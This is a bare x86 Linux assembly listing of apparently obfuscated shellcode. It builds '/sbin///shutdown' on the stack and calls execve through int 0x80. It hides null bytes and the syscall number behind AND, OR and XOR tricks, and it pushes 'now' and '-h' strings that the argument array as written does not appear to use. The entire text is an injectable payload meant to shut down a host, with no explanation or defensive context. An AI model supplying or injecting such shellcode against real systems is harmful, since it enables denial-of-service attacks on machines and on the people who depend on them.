global _start
section .text
_start:
mov eax, 0x454e4f4a
and eax, 0x3a313035
push eax
push word 0x682c
xor [esp], byte 0x1
push eax
push byte 0x77
push word 0x6f6e
push eax
push   0x6e776f64
push   0x74756873
push   0x2f2f2f6e
push   0x6962732f
mov ebx, esp
push eax
push ebx
mov ecx,esp 
mov al,8
or al, 2
or al,1
int 0x80
